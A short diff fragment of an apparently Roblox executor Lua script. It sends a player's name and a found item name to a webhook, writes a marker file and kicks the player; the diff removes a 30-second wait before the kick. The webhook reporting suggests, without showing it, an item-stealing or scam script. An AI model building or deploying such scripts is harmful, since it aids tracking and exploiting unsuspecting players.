@@ -62,7 +62,6 @@ local baseName = foundName and foundName:match('^(.-)%s*%[')
 or (foundName or 'Unknown')
 sendWebhook(string.format('%s:%s', player.Name, baseName))
 writefile(filename, 'Yummytool')
-wait(30)
 player:Kick('du pet r be iu di ra th')
 end
 
